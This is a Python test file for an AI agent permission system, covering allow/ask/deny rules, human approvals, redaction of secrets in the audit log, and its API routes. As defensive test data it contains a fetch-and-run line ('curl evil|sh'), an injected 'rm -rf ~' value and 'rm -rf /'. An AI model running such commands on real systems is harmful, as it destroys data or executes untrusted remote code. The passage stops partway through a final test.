"""Tests for the agent permission system: decisions, approvals, audit log and API routes."""
import hashlib
import json
import os
import shutil
import sqlite3
import stat
import sys
import tempfile
import threading
import time
import unittest
from unittest import mock

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "files/system/usr/lib/forge"))

from fastapi import FastAPI, Header, HTTPException  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402
from forgecore import policy as P  # noqa: E402

TOKEN = "test-token"


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.db = os.path.join(self.tmp, "sub", "dir", "policy.db")
        self.conf = os.path.join(self.tmp, "conf", "agents.json")
        self.p = P.Policy(self.db, self.conf)

    def tearDown(self):
        self.p.close()
        shutil.rmtree(self.tmp, ignore_errors=True)


class DecideTests(Base):
    def test_defaults(self):
        self.assertTrue(os.path.exists(self.db))
        self.assertEqual(self.p.get_config(), {"actions": {}, "agents": {}})
        for action, (_, default) in P.ACTIONS.items():
            self.assertEqual(self.p.decide("bot", action), default)

    def test_wal_mode(self):
        con = sqlite3.connect(self.db)
        self.assertEqual(con.execute("PRAGMA journal_mode").fetchone()[0], "wal")
        con.close()

    def test_unknown_action_denied(self):
        self.assertEqual(self.p.decide("bot", "nuke.everything"), "deny")
        self.assertEqual(self.p.check("bot", "nuke.everything", {})["decision"], "deny")

    def test_override_precedence(self):
        self.p.set_config({"actions": {"web.fetch": "allow", "files.write": "allow"},
                           "agents": {"bot": {"web.fetch": "ask", "models.pull": "allow"}}})
        self.assertEqual(self.p.decide("bot", "web.fetch"), "ask")      # agent beats global
        self.assertEqual(self.p.decide("other", "web.fetch"), "allow")  # global beats default
        self.assertEqual(self.p.decide("bot", "models.pull"), "allow")  # agent beats default
        self.assertEqual(self.p.decide("bot", "files.write"), "allow")
        self.assertEqual(self.p.decide("bot", "notify"), "allow")       # default

    def test_deny_wins(self):
        self.p.set_config({"actions": {"web.fetch": "deny", "notify": "allow"},
                           "agents": {"bot": {"web.fetch": "allow", "notify": "deny"}}})
        self.assertEqual(self.p.decide("bot", "web.fetch"), "deny")
        self.assertEqual(self.p.decide("bot", "notify"), "deny")
        self.assertEqual(self.p.decide("other", "notify"), "allow")

    def test_missing_and_broken_file(self):
        os.makedirs(os.path.dirname(self.conf))
        with open(self.conf, "w") as f:
            json.dump({"actions": {"notify": "deny"}}, f)
        p2 = P.Policy(self.db, self.conf)
        self.assertEqual(p2.decide("x", "notify"), "deny")
        p2.close()
        with open(self.conf, "w") as f:
            f.write("{not json")
        p3 = P.Policy(self.db, self.conf)
        self.assertEqual(p3.decide("x", "notify"), "allow")
        p3.close()

    def test_broken_file_fails_safe(self):
        os.makedirs(os.path.dirname(self.conf))
        for content in ("{not json", json.dumps({"actions": {"web.fetch": "sure"}}),
                        json.dumps({"actions": {"command.run": "allow", "fake": "allow"}})):
            with self.subTest(content=content):
                with open(self.conf, "w") as f:
                    f.write(content)
                p = P.Policy(self.db, self.conf)
                for action, (_, default) in P.ACTIONS.items():
                    self.assertEqual(p.decide("x", action), "allow" if default == "allow" else "deny")
                self.assertIn("error", p.get_config())
                self.assertEqual(p.check("x", "web.fetch", {})["decision"], "deny")
                # Saving a good config clears the error.
                p.set_config({"actions": {}, "agents": {}})
                self.assertNotIn("error", p.get_config())
                self.assertEqual(p.decide("x", "web.fetch"), "ask")
                p.close()

    def test_config_with_error_key_can_be_saved_back(self):
        self.p.set_config({"actions": {"notify": "ask"}, "agents": {}, "error": "old"})
        self.assertEqual(self.p.get_config(), {"actions": {"notify": "ask"}, "agents": {}})


class ConfigTests(Base):
    def test_validation_errors(self):
        bad = [
            "nope",
            {"actions": {"notify": "maybe"}},
            {"actions": {"fake.action": "allow"}},
            {"agents": {"bot": {"fake.action": "allow"}}},
            {"agents": {"bot": {"notify": "yes"}}},
            {"agents": {"bot": "allow"}},
            {"agents": {"": {"notify": "allow"}}},
            {"agents": []},
            {"actions": []},
            {"extra": {}},
        ]
        for cfg in bad:
            with self.subTest(cfg=cfg):
                with self.assertRaises(ValueError):
                    self.p.set_config(cfg)
        self.assertFalse(os.path.exists(self.conf))

    def test_atomic_write(self):
        cfg = {"actions": {"notify": "ask"}, "agents": {"bot": {"files.write": "allow"}}}
        self.p.set_config(cfg)
        with open(self.conf) as f:
            self.assertEqual(json.load(f), cfg)
        self.assertEqual(stat.S_IMODE(os.stat(self.conf).st_mode), 0o644)
        self.assertEqual(os.listdir(os.path.dirname(self.conf)), ["agents.json"])
        self.assertEqual(self.p.get_config(), cfg)

        # A failed rename leaves the old file and no temp files behind.
        with mock.patch("forgecore.policy.os.replace", side_effect=OSError("disk full")):
            with self.assertRaises(OSError):
                self.p.set_config({"actions": {"notify": "deny"}})
        with open(self.conf) as f:
            self.assertEqual(json.load(f), cfg)
        self.assertEqual(os.listdir(os.path.dirname(self.conf)), ["agents.json"])
        self.assertEqual(self.p.decide("bot", "notify"), "ask")

    def test_get_config_is_a_copy(self):
        cfg = self.p.get_config()
        cfg["actions"]["notify"] = "deny"
        self.assertEqual(self.p.decide("bot", "notify"), "allow")


class ApprovalTests(Base):
    def test_request_and_answer(self):
        aid = self.p.request("bot", "web.fetch", {"url": "https://x"}, run_id="r1")
        self.assertEqual(len(aid), 32)
        a = self.p.get(aid)
        self.assertEqual(a["status"], "pending")
        self.assertEqual(a["agent"], "bot")
        self.assertEqual(a["details"], {"url": "https://x"})
        self.assertEqual(a["run_id"], "r1")
        self.assertEqual(set(a), {"id", "agent", "action", "details", "run_id", "status", "created",
                                  "expires", "decided_by", "decided_at"})
        self.assertEqual([x["id"] for x in self.p.list()], [aid])

        out = self.p.answer(aid, True, "alice")
        self.assertEqual(out["status"], "approved")
        self.assertEqual(out["decided_by"], "alice")
        self.assertIsNotNone(out["decided_at"])
        self.assertEqual(self.p.list(), [])
        self.assertEqual(len(self.p.list("approved")), 1)
        self.assertEqual(len(self.p.list(None)), 1)
        log = self.p.audit_log(actor="alice")
        self.assertEqual(log[0]["decision"], "approved")
        self.assertEqual(log[0]["details"]["approval_id"], aid)

    def test_deny_answer(self):
        aid = self.p.request("bot", "web.fetch", {})
        self.assertEqual(self.p.answer(aid, False, "bob")["status"], "denied")

    def test_answer_twice(self):
        aid = self.p.request("bot", "web.fetch", {})
        self.p.answer(aid, True, "alice")
        with self.assertRaises(ValueError):
            self.p.answer(aid, False, "alice")
        with self.assertRaises(ValueError):
            self.p.answer("missing", True, "alice")
        self.assertIsNone(self.p.get("missing"))

    def test_expire(self):
        aid = self.p.request("bot", "web.fetch", {}, ttl_s=-1)
        self.assertEqual(self.p.get(aid)["status"], "expired")
        self.assertEqual(self.p.list(), [])
        with self.assertRaises(ValueError):
            self.p.answer(aid, True, "alice")
        with self.assertRaises(ValueError):
            self.p.list("weird")

    def test_wait_approved_by_other_thread(self):
        aid = self.p.request("bot", "web.fetch", {})
        t = threading.Timer(0.2, lambda: self.p.answer(aid, True, "alice"))
        t.start()
        start = time.monotonic()
        self.assertEqual(self.p.wait(aid, 5, poll_s=0.05), "approved")
        self.assertLess(time.monotonic() - start, 3)
        t.join()

    def test_wait_timeout(self):
        aid = self.p.request("bot", "web.fetch", {})
        start = time.monotonic()
        self.assertEqual(self.p.wait(aid, 0.3, poll_s=0.05), "pending")
        self.assertGreaterEqual(time.monotonic() - start, 0.25)

    def test_expire_method(self):
        aid = self.p.request("bot", "web.fetch", {}, run_id="r1")
        out = self.p.expire(aid, "runner stopped waiting")
        self.assertEqual(out["status"], "expired")
        self.assertEqual(self.p.get(aid)["status"], "expired")
        log = self.p.audit_log()[0]
        self.assertEqual((log["actor"], log["action"], log["decision"]), ("bot", "web.fetch", "expired"))
        self.assertEqual(log["details"]["reason"], "runner stopped waiting")
        with self.assertRaises(ValueError):
            self.p.expire(aid, "again")
        with self.assertRaises(ValueError):
            self.p.answer(aid, True, "alice")
        with self.assertRaises(ValueError):
            self.p.expire("missing", "x")
        done = self.p.request("bot", "web.fetch", {})
        self.p.answer(done, True, "alice")
        with self.assertRaises(ValueError):
            self.p.expire(done, "late")
        self.assertEqual(self.p.get(done)["status"], "approved")

    def test_approval_details_exact(self):
        # Approvals show exactly what will happen (admin token only); the audit log is redacted.
        aid = self.p.request("bot", "ai.cloud", {"api_key": "sk-123", "model": "x"})
        self.assertEqual(self.p.get(aid)["details"], {"api_key": "sk-123", "model": "x"})

    def test_setting_key_stays_visible(self):
        aid = self.p.request("bot", "settings.write", {"key": "ai.keep_alive_min", "value": 10})
        self.assertEqual(self.p.get(aid)["details"], {"key": "ai.keep_alive_min", "value": 10})


class AuditTests(Base):
    def test_redaction_nested(self):
        self.p.audit("bot", "ai.cloud", "allow", {
            "Password": "hunter2", "API_KEY": "k", "model": "qwen",
            "nested": {"auth-token": "t", "deeper": {"client_secret": "s", "ok": 1}},
            "items": [{"token": "t2", "name": "n"}],
        })
        d = self.p.audit_log()[0]["details"]
        self.assertEqual(d["Password"], "[hidden]")
        self.assertEqual(d["API_KEY"], "[hidden]")
        self.assertEqual(d["model"], "qwen")
        self.assertEqual(d["nested"]["auth-token"], "[hidden]")
        self.assertEqual(d["nested"]["deeper"], {"client_secret": "[hidden]", "ok": 1})
        self.assertEqual(d["items"], [{"token": "[hidden]", "name": "n"}])
        con = sqlite3.connect(self.db)
        raw = con.execute("SELECT details FROM audit").fetchone()[0]
        con.close()
        for s in ("hunter2", "sk-", '"k"', '"t"', '"s"', "t2"):
            self.assertNotIn(s, raw)

    def test_redaction_names(self):
        hidden = ["password", "PASSWD", "secret", "Token", "api_key", "API-KEY", "apikey", "access_token",
                  "refresh-token", "client_secret", "Authorization", "private_key", "db_secret",
                  "github_token", "admin_password", "openai_api_key", "OPENAI-API-KEY"]
        shown = ["key", "Key", "keys", "monkey", "key_name", "setting_key", "tokens_used", "max_tokens",
                 "token_count", "keep_alive", "secretary", "author"]
        # password_hint used to be shown. Since R12 it is hidden on purpose: users often
        # type the real password as the hint, so hiding it is the safer choice.
        hidden.append("password_hint")
        for name in hidden:
            self.assertEqual(P.clean_details({name: "v"}), {name: "[hidden]"}, name)
        for name in shown:
            self.assertEqual(P.clean_details({name: "v"}), {name: "v"}, name)

    def test_truncation(self):
        self.p.audit("bot", "web.fetch", "allow", {"body": "x" * 5000, "deep": {"list": ["y" * 3000]}},
                     result="z" * 5000)
        e = self.p.audit_log()[0]
        self.assertEqual(len(e["details"]["body"]), 2000)
        self.assertEqual(len(e["details"]["deep"]["list"][0]), 2000)
        self.assertEqual(len(e["result"]), 2000)

    def test_filters_and_order(self):
        self.p.audit("a", "notify", "allow")
        self.p.audit("b", "notify", "allow")
        self.p.audit("a", "web.fetch", "ask")
        log = self.p.audit_log()
        self.assertEqual([(e["actor"], e["action"]) for e in log],
                         [("a", "web.fetch"), ("b", "notify"), ("a", "notify")])
        self.assertIsNone(log[0]["details"])
        self.assertEqual(len(self.p.audit_log(actor="a")), 2)
        self.assertEqual(len(self.p.audit_log(action="notify")), 2)
        self.assertEqual(len(self.p.audit_log(actor="a", action="notify")), 1)
        self.assertEqual(len(self.p.audit_log(limit=1)), 1)
        self.assertEqual(len(self.p.audit_log(since_s=60)), 3)
        with mock.patch("forgecore.policy.time.time", return_value=time.time() - 3600):
            self.p.audit("old", "notify", "allow")
        self.assertEqual(len(self.p.audit_log(since_s=60)), 3)
        self.assertEqual(len(self.p.audit_log()), 4)

    def test_prune(self):
        old = time.time() - 100 * 86400
        with mock.patch("forgecore.policy.time.time", return_value=old):
            self.p.audit("old", "notify", "allow")
            done = self.p.request("bot", "web.fetch", {})
            self.p.answer(done, True, "alice")
            waiting = self.p.request("bot", "web.fetch", {}, ttl_s=10**9)
        self.p.audit("new", "notify", "allow")
        self.p.prune(90)
        self.assertEqual([e["actor"] for e in self.p.audit_log()], ["new"])
        self.assertIsNone(self.p.get(done))
        self.assertEqual(self.p.get(waiting)["status"], "pending")
        self.p.prune(0)
        self.assertEqual(self.p.audit_log(), [])

    def test_prune_uses_indexes(self):
        con = sqlite3.connect(self.db)
        for sql in ("DELETE FROM audit WHERE ts < 1",
                    "DELETE FROM approvals WHERE status != 'pending' AND created < 1",
                    "UPDATE approvals SET status='expired' WHERE status='pending' AND expires < 1"):
            plan = " ".join(r[-1] for r in con.execute("EXPLAIN QUERY PLAN " + sql))
            self.assertIn("USING", plan, sql)
            self.assertNotIn("SCAN approvals\b", plan)
        con.close()

    def test_prune_many_rows_is_fast(self):
        old = time.time() - 100 * 86400
        with mock.patch("forgecore.policy.time.time", return_value=old):
            for _ in range(2000):
                self.p.audit("old", "notify", "allow")
        start = time.monotonic()
        self.p.prune(90)
        self.p.prune(90)
        self.assertLess(time.monotonic() - start, 2)
        self.assertEqual(self.p.audit_log(), [])


class R12RedactionTests(Base):
    def test_r12_more_secret_names_hidden(self):
        hidden = ["aws_secret_access_key", "AWS_SECRET_ACCESS_KEY", "secret_key", "secretKey", "cookie",
                  "Cookie", "set_cookie", "Set-Cookie", "passphrase", "keyPassphrase", "privateKey",
                  "PrivateKey", "accessToken", "apiKey", "APIKey", "x-api-key", "clientSecret",
                  "credentials", "credential", "auth", "proxy_authorization", "access_key", "password_hint"]
        shown = ["key", "Key", "max_tokens", "maxTokens", "tokens", "token_count", "tokenCount",
                 "prompt_tokens", "completion_tokens", "tokens_used", "author", "monkey", "setting_key",
                 "keep_alive", "secretary", "keys"]
        for name in hidden:
            self.assertEqual(P.clean_details({name: "v"}), {name: "[hidden]"}, name)
        for name in shown:
            self.assertEqual(P.clean_details({name: 5}), {name: 5}, name)

    def test_r12_nested_credentials_hidden(self):
        d = P.clean_details({"profile": {"credentials": {"user": "bob", "pw": "hunter2"}},
                             "list": [{"Cookie": "sid=abc"}]})
        self.assertEqual(d, {"profile": {"credentials": "[hidden]"}, "list": [{"Cookie": "[hidden]"}]})

    def test_r12_secrets_in_urls_hidden(self):
        secrets = ["T0KEN1", "K3Y2", "AK3", "AT4", "S1G5", "PW6", "GHP7", "SECRETKEY8"]
        d = P.clean_details({
            "url": "https://api.example.com/x?page=2&token=T0KEN1&q=cats",
            "text": "see https://maps.example.com/api?key=K3Y2 and http://h/p?api_key=AK3#top",
            "more": ["/cb?access_token=AT4", "https://blob.example.com/f?sv=1&sig=S1G5&se=2"],
            "clone": "git clone https://bob:PW6@git.example.com/repo.git",
            "gh": "https://GHP7@github.com/me/repo",
            "s3": "https://s3.example.com/b?X-Amz-Signature=SECRETKEY8",
        })
        raw = json.dumps(d)
        for s in secrets:
            self.assertNotIn(s, raw, s)
        self.assertIn("page=2", d["url"])
        self.assertIn("q=cats", d["url"])
        self.assertIn("token=[hidden]", d["url"])
        self.assertIn("git.example.com/repo.git", d["clone"])
        self.assertIn("#top", d["text"])

    def test_r12_audit_also_hides_url_secrets(self):
        self.p.audit("bot", "web.fetch", "allow", {"url": "https://x.example/?api_key=ZZSECRET"})
        con = sqlite3.connect(self.db)
        raw = con.execute("SELECT details FROM audit").fetchone()[0]
        con.close()
        self.assertNotIn("ZZSECRET", raw)

    def test_r12_approval_shows_whole_file_write(self):
        content = "line of the file\n" * 3000          # 48000 characters
        r = self.p.check("bot", "files.write", {"tool": "write_file",
                                                "args": {"path": "notes.txt", "content": content}})
        a = self.p.get(r["approval_id"])
        self.assertEqual(a["details"]["args"]["content"], content)
        info = a["details"]["_long_text"]
        self.assertEqual(info, [{"path": "args.content", "length": len(content),
                                 "sha256": hashlib.sha256(content.encode()).hexdigest(), "cut": False}])
        # The audit log stays short.
        log = self.p.audit_log()[0]
        self.assertEqual(len(log["details"]["details"]["args"]["content"]), 2000)

    def test_r12_approval_cap_200kb(self):
        # Third review: an approval never stores a cut copy; too-large requests are refused.
        content = "y" * 300_000
        with self.assertRaises(ValueError):
            self.p.request("bot", "files.write", {"args": {"content": content}})
        self.assertEqual(self.p.list("pending"), [])

    def test_r12_short_approvals_unchanged(self):
        aid = self.p.request("bot", "settings.write", {"key": "ai.keep_alive_min", "value": 10})
        self.assertEqual(self.p.get(aid)["details"], {"key": "ai.keep_alive_min", "value": 10})


class R12ResidualTests(Base):
    """Names and forms the second review found still shown."""

    def test_more_secret_names_hidden(self):
        hidden = ["pwd", "pass", "jwt", "bearer", "ssh_key", "sshKey", "signing_key", "otp", "totp_seed",
                  "mnemonic", "seed_phrase", "seedPhrase", "connection_string", "connectionString",
                  "database_url", "DATABASE_URL", "session", "sessionid", "session_id", "jsessionid",
                  "recovery_key", "encryption_key", "master_key"]
        shown = ["seed", "passthrough", "compass", "database", "url", "session_count", "max_tokens",
                 "key", "setting_key", "otp_enabled_count"]
        for name in hidden:
            self.assertEqual(P.clean_details({name: "v"}), {name: "[hidden]"}, name)
        for name in shown:
            self.assertEqual(P.clean_details({name: 5}), {name: 5}, name)

    def test_header_lists_hidden(self):
        d = P.clean_details({"headers": [["Authorization", "Bearer XYZ1"], ["Accept", "application/json"],
                                         ("Cookie", "sid=XYZ2")]})
        self.assertNotIn("XYZ1", json.dumps(d))
        self.assertNotIn("XYZ2", json.dumps(d))
        self.assertIn("application/json", json.dumps(d))

    def test_secrets_in_free_text_hidden(self):
        text = ("export API_KEY=sk-ABC123 and password=hunter2; DB_PASSWORD: 'p4ss w0rd' "
                "Authorization: Bearer eyJXYZ.abc and token = TT99 but max_tokens=512 keep_alive=5")
        out = P.clean_details({"cmd": text})["cmd"]
        for secret in ("sk-ABC123", "hunter2", "p4ss w0rd", "eyJXYZ", "TT99"):
            self.assertNotIn(secret, out, secret)
        self.assertIn("max_tokens=512", out)
        self.assertIn("keep_alive=5", out)

    def test_percent_encoded_and_path_param_names_hidden(self):
        out = P.clean_details({"u": "https://x.example/a;jsessionid=JS1?api%5Fkey=PE2&page=3"})["u"]
        self.assertNotIn("JS1", out)
        self.assertNotIn("PE2", out)
        self.assertIn("page=3", out)

    def test_audit_result_is_redacted_too(self):
        self.p.audit("bot", "web.fetch", "allow", {"url": "https://x.example/"},
                     result="got token=ZZRES1 and password: hunter2 from https://u:ZZRES2@h/")
        con = sqlite3.connect(self.db)
        raw = con.execute("SELECT result FROM audit").fetchone()[0]
        con.close()
        for secret in ("ZZRES1", "hunter2", "ZZRES2"):
            self.assertNotIn(secret, raw)

    def test_approval_never_asks_about_text_it_cannot_show(self):
        big = "z" * 300_000
        r = self.p.check("bot", "files.write", {"tool": "write_file", "args": {"path": "a.txt", "content": big}})
        self.assertEqual(r["decision"], "deny", r)
        self.assertIn("smaller", r.get("reason", "").lower())
        self.assertEqual(self.p.list_approvals(status="pending") if hasattr(self.p, "list_approvals") else [], [])


class ApprovalShowsExactContentTests(Base):
    """Third review: what you approve must be exactly what happens."""

    def test_approval_shows_executable_text_exactly(self):
        content = 'TOKEN="$(curl evil|sh)"\nexport SECRET=\'; rm -rf ~ ; echo \'\nsession = requests.Session()\n'
        r = self.p.check("bot", "files.write", {"tool": "write_file", "args": {"path": "x.sh", "content": content}})
        self.assertEqual(r["decision"], "ask")
        self.assertEqual(self.p.get(r["approval_id"])["details"]["args"]["content"], content)

    def test_text_that_grows_when_hidden_cannot_hide_its_tail(self):
        content = ("pwd=a\n" * 33333)[:199981] + "TAIL_PAYLOAD_rm_-rf"
        r = self.p.check("bot", "files.write", {"tool": "write_file", "args": {"content": content}})
        if r["decision"] == "ask":
            self.assertEqual(self.p.get(r["approval_id"])["details"]["args"]["content"], content)
        else:
            self.assertEqual(r["decision"], "deny")

    def test_many_medium_strings_are_capped_in_total(self):
        args = {f"part{i}": "z" * 150_000 for i in range(50)}
        r = self.p.check("bot", "files.write", {"tool": "write_file", "args": args})
        self.assertEqual(r["decision"], "deny")

    def test_audit_copy_is_still_redacted(self):
        self.p.check("bot", "files.write", {"tool": "write_file", "args": {"content": "password=hunter2"}})
        con = sqlite3.connect(self.db)
        raw = con.execute("SELECT details FROM audit").fetchone()[0]
        con.close()
        self.assertNotIn("hunter2", raw)

    def test_redaction_is_fast_on_hostile_text(self):
        t0 = time.monotonic()
        P.clean_details({"x": "a" * 100_000 + "://x", "y": "b" * 100_000 + "=c", "z": "?" * 100_000})
        self.assertLess(time.monotonic() - t0, 1.0)


class ApprovalRobustnessTests(Base):
    """Fourth review: an agent must not be able to break the approval or audit views."""

    def test_odd_values_cannot_break_the_lists(self):
        self.p.check("bot", "files.write", {"args": {"a": float("nan"), "b": float("inf"), "c": "\ud800x",
                                                      "d": [float("-inf")]}})
        for rows in (self.p.list("pending"), self.p.audit_log()):
            json.dumps(rows, allow_nan=False).encode("utf-8")   # what the API does; must not fail

    def test_huge_numbers_count_toward_the_size_limit(self):
        r = self.p.check("bot", "files.write", {"args": {"n": [10 ** 4000] * 1000}})
        self.assertEqual(r["decision"], "deny")

    def test_private_key_pattern_is_fast(self):
        t0 = time.monotonic()
        P._hide_text_secrets("-----BEGIN RSA PRIVATE KEY-----" * 30000)
        self.assertLess(time.monotonic() - t0, 1.0)


class CheckTests(Base):
    def test_allow(self):
        r = self.p.check("bot", "metrics.read", {"what": "cpu"})
        self.assertEqual(r, {"decision": "allow", "approval_id": None})
        log = self.p.audit_log()
        self.assertEqual((log[0]["actor"], log[0]["action"], log[0]["decision"]), ("bot", "metrics.read", "allow"))
        self.assertEqual(self.p.list(None), [])

    def test_ask_ttl(self):
        r = self.p.check("bot", "web.fetch", {}, ttl_s=60)
        a = self.p.get(r["approval_id"])
        self.assertAlmostEqual(a["expires"] - a["created"], 60, places=3)
        r = self.p.check("bot", "web.fetch", {})
        a = self.p.get(r["approval_id"])
        self.assertAlmostEqual(a["expires"] - a["created"], 900, places=3)
        r = self.p.check("bot", "web.fetch", {}, ttl_s=-1)
        self.assertEqual(self.p.get(r["approval_id"])["status"], "expired")

    def test_ask(self):
        r = self.p.check("bot", "web.fetch", {"url": "https://x", "token": "abc"}, run_id="r9")
        self.assertEqual(r["decision"], "ask")
        a = self.p.get(r["approval_id"])
        self.assertEqual((a["status"], a["run_id"], a["details"]["token"]), ("pending", "r9", "abc"))
        log = self.p.audit_log()[0]
        self.assertEqual(log["decision"], "ask")
        self.assertEqual(log["details"]["approval_id"], r["approval_id"])
        self.assertEqual(log["details"]["details"]["token"], "[hidden]")

    def test_deny(self):
        r = self.p.check("bot", "command.run", {"cmd": "rm -rf /"})
        self.assertEqual(r, {"decision": "deny", "approval_id": None})
        self.assertEqual(self.p.audit_log()[0]["decision"], "deny")
        self.assertEqual(self.p.list(None), [])


class RouterTests(Base):
    def setUp(self):
        super().setUp()

        def auth(x_forge_token: str = Header(default="")):
            if x_forge_token != TOKEN:
                raise HTTPException(401, "Missing or wrong Forge token.")

        app = FastAPI()
        app.include_router(P.make_router(self.p, auth), prefix="/api")
        self.c = TestClient(app)
        self.h = {"X-Forge-Token": TOKEN}

    def test_auth_required(self):
        for method, url in [("get", "/api/policy"), ("put", "/api/policy"), ("get", "/api/approvals"),
                            ("post", "/api/approvals/x/approve"), ("post", "/api/approvals/x/deny"),
                            ("get", "/api/audit")]:
            with self.subTest(url=url):
                self.assertEqual(getattr(self.c, method)(url).status_code, 401)
                r = getattr(self.c, method)(url, headers={"X-Forge-Token": "wrong"})
                self.assertEqual(r.status_code, 401)

    def test_policy_get_put(self):
        r = self.c.get("/api/policy", headers=self.h)
        self.assertEqual(r.status_code, 200)
        body = r.json()
        self.assertEqual(len(body["actions"]), len(P.ACTIONS))
        web = next(a for a in body["actions"] if a["id"] == "web.fetch")
        self.assertEqual((web["default"], web["effective"]), ("ask", "ask"))
        self.assertEqual(web["description"], "Read a web page")

        r = self.c.put("/api/policy", headers=self.h, json={"config": {"actions": {"web.fetch": "allow"}}})
        self.assertEqual(r.status_code, 200)
        web = next(a for a in self.c.get("/api/policy", headers=self.h).json()["actions"] if a["id"] == "web.fetch")
        self.assertEqual(web["effective"], "allow")

        r = self.c.put("/api/policy", headers=self.h, json={"config": {"actions": {"web.fetch": "sure"}}})
        self.assertEqual(r.status_code, 422)
        r = self.c.put("/api/policy", headers=self.h, json={"config": {"actions": {"bogus": "allow"}}})
        self.assertEqual(r.status_code, 422)
        self.assertEqual(self.p.decide("x", "web.fetch"), "allow")

    def test_approvals_flow(self):
        a1 = self.p.request("bot", "web.fetch", {"url": "u"})
        a2 = self.p.request("bot", "models.pull", {"name": "qwen3:8b"})
        r = self.c.get("/api/approvals", headers=self.h)
        self.assertEqual({a["id"] for a in r.json()}, {a1, a2})

        r = self.c.post(f"/api/approvals/{a1}/approve", headers=self.h)
        self.assertEqual(r.status_code, 200)
        self.assertEqual((r.json()["status"], r.json()["decided_by"]), ("approved", "admin"))
        r = self.c.post(f"/api/approvals/{a2}/deny", headers=self.h, json={"by": "alice"})
        self.assertEqual((r.json()["status"], r.json()["decided_by"]), ("denied", "alice"))

        self.assertEqual(self.c.post(f"/api/approvals/{a1}/deny", headers=self.h).status_code, 409)
        self.assertEqual(self.c.post("/api/approvals/nope/approve", headers=self.h).status_code, 404)
        self.assertEqual(self.c.get("/api/approvals", headers=self.h).json(), [])
        r = self.c.get("/api/approvals?status=approved", headers=self.h)
        self.assertEqual([a["id"] for a in r.json()], [a1])
        self.assertEqual(self.c.get("/api/approvals?status=bad", headers=self.h).status_code, 422)

    def test_audit_endpoint(self):
        self.p.audit("a", "notify", "allow", {"password": "p"})
        self.p.audit("b", "web.fetch", "ask")
        r = self.c.get("/api/audit", headers=self.h)
        self.assertEqual(r.status_code, 200)
        self.assertEqual([e["actor"] for e in r.json()], ["b", "a"])
        self.assertEqual(r.json()[1]["details"], {"password": "[hidden]"})
        r = self.c.get("/api/audit?actor=a&action=notify&limit=5&since=60", headers=self.h)
        self.assertEqual(len(r.json()), 1)
        self.assertEqual(len(self.c.get("/api/audit?limit=1", headers=self.h).json()), 1)
        self.assertEqual(self.c.get("/api/audit?limit=0", headers=self.h).status_code, 422)


if __name__ == "__main__":
    unittest.main()


class PreCutFragmentTest(unittest.TestCase):
    """Found in review: text cut early (for speed) could split a secret; hiding earlier secrets
    then shortened the text and pulled the split piece into view."""

    def scenario(self):
        big = "".join("password=" + "A" * 1000 + " " for _ in range(9))
        frag = " https://alice:hunt"
        pad = 9192 - len(big) - len(frag)
        return big + "y" * pad + " https://alice:hunter2@backup.example/repo"

    def test_policy_never_shows_a_split_secret(self):
        out = P.clean_details(self.scenario(), 1000)
        self.assertNotIn("alice:hunt", out)

    def test_timeline_never_shows_a_split_secret(self):
        from forgecore import timeline as T
        d = T.entry(1, "agent", "t", self.scenario())["detail"]
        self.assertNotIn("alice:hunt", d)


class EarlyCutNeverShowsTheCutEdgeTest(unittest.TestCase):
    """Second review: no part of the text near the early cut may ever be shown, whatever shape
    a secret has there (no spaces, or a quoted value split at a space)."""

    def setUp(self):
        self.n = P.MAX_STR + 8192
        self.shrink = " ".join("sk-" + "A" * 500 for _ in range(18)) + " "

    def test_token_with_no_spaces_near_the_cut(self):
        k = self.n - 512 - 20
        b = self.shrink + "z" * (k - len(self.shrink)) + ",ghp_PARTIALTOK" + "Q" * 40 + "," + "z" * 2000
        self.assertNotIn("PARTIALTOK", P.clean_details(b))

    def test_quoted_value_split_at_a_space(self):
        sec = "SECRETWORD1 SECRETWORD2 SECRETWORD3"
        pre = self.shrink + "x" * 10
        pos = self.n - 40 - len(' --password "')
        a = pre + "f " * ((pos - len(pre)) // 2) + ' --password "' + sec + " " + "y" * 100 + '" rest'
        out = P.clean_details(a)
        self.assertNotIn("SECRETWORD1", out)
        self.assertNotIn("SECRETWORD2", out)

    def test_single_quoted_value_split(self):
        d = (self.shrink + "w " * ((self.n - 30 - len(self.shrink)) // 2)
             + "--token 'QUOTEDSECRET part2 part3'" + " z" * 100)
        self.assertNotIn("QUOTEDSECRET", P.clean_details(d))

    def test_short_text_is_unchanged_by_the_cut_logic(self):
        self.assertEqual(P.clean_details("hello world"), "hello world")
        long_plain = "word " * 5000
        self.assertEqual(P.clean_details(long_plain), long_plain[:P.MAX_STR])


class EdgeCoversTheLongestPatternTest(unittest.TestCase):
    """Third review: patterns can match up to about 4 KB, so a quoted secret cut by the early
    cut could still reach into the shown text when the hidden edge was only 1 KB."""

    def build(self, quote, flag="--password", gap=2000, vlen=3000):
        m, n0 = P.MAX_STR, P.MAX_STR + 8192
        tok = "sk-" + "A" * 500 + " "
        q = n0 - gap
        k = (q - (m - 500)) // (len(tok) - 9) + 1
        pre = tok * k
        head = flag + " " + quote
        filler = "f " * ((q - len(head) - len(pre)) // 2)
        return pre + filler + head + "PWSECRET" + "y" * (vlen - 8) + quote + " tail" + " z" * 3000

    def test_long_double_quoted_value(self):
        s = self.build('"')
        self.assertNotIn("PWSECRET", P._hide_text_secrets(s))   # the full scan hides it
        self.assertNotIn("PWSECRET", P.clean_details(s))

    def test_long_single_quoted_value(self):
        self.assertNotIn("PWSECRET", P.clean_details(self.build("'", "--token")))

    def test_edge_is_wider_than_the_longest_pattern(self):
        self.assertGreaterEqual(P.EDGE, 4096 * 2)


class DeepNestingTest(unittest.TestCase):
    """Python 3.15 (Fedora 45) parses 100000 nested brackets that older Pythons refused, and the
    parsed value then reached clean_details, which walked it recursively: RecursionError, so a
    hostile tool call made the agent run fail (seen in CI). Deep parts are now replaced, never walked."""

    @staticmethod
    def deep(n, leaf):
        v = leaf
        for _ in range(n):
            v = [v]
        return v

    def test_very_deep_lists_and_dicts_do_not_raise(self):
        for shape in (self.deep(100000, "x"), {"a": self.deep(100000, "x")}):
            out = P.clean_details(shape, 20_000)
            json.dumps(out)                       # and the result is safe to store
            self.assertIn(P.TOO_DEEP, json.dumps(out))

    def test_a_secret_below_the_limit_is_still_hidden_and_one_past_it_is_not_shown(self):
        shallow = self.deep(10, {"password": "Sup3rSecretValue"})
        self.assertNotIn("Sup3rSecretValue", json.dumps(P.clean_details(shallow)))
        deep = self.deep(500, {"api_key": "AnotherSecretValue1"})
